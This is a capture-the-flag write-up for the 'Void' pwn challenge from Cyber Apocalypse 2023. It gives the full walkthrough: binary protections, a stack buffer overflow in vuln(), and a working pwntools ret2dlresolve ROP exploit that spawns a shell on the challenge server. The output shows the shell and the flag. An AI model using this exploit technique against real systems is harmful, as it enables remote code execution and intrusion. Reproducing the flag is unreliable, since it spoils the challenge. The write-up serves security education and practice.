# Cyber Apocalypse 2023

## Void

> The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.
>
>  Author: N/A
>
> [`pwn_void.zip`](pwn_void.zip)

Tags: _pwn_

## Solution
First things first, check the security measurements the delivered executable has. So, no canary and partial relocation.

```bash
$ checksec void
[*] '/home/user/cyberapoc23/pwn/void/challenge/void'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

The program is very simplistic.

```c++
void vuln(void)
{
  undefined local_48 [64];
  
  read(0,local_48,200);
  return;
}

undefined8 main(void)
{
  vuln();
  return 0;
}
```

No flag available anywhere. For this we can use return oriented programming (rop) to redirect the processor into the direction we want (e.g. spawning a shell). 

```python
from pwn import *

binary = context.binary = ELF("./void")

p = process(binary.path)
p.sendline(cyclic(1024, n=8))
p.wait()
core = p.corefile
p.close
os.remove(core.file.name)
padding = cyclic_find(core.read(core.rsp, 8), n=8)
log.info('padding: ' + hex(padding))

rop = ROP(binary)
dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])
rop.read(0, dl.data_addr)
rop.ret2dlresolve(dl)
raw_rop = rop.chain()

if args.REMOTE:
    p = remote("68.183.45.143", 31014)
else:
    p = binary.process()

p.sendline(fit({padding: raw_rop, 200: dl.payload}))
p.interactive()
```

```bash
$ python exploit.py REMOTE
[*] Loaded 14 cached gadgets for './void'
[+] Opening connection to 68.183.45.143 on port 32738: Done
[*] Switching to interactive mode
$ ls
flag.txt
glibc
void
$ cat flag.txt
HTB{r3s0lv3_th3_d4rkn355}
```

Flag `HTB{r3s0lv3_th3_d4rkn355}`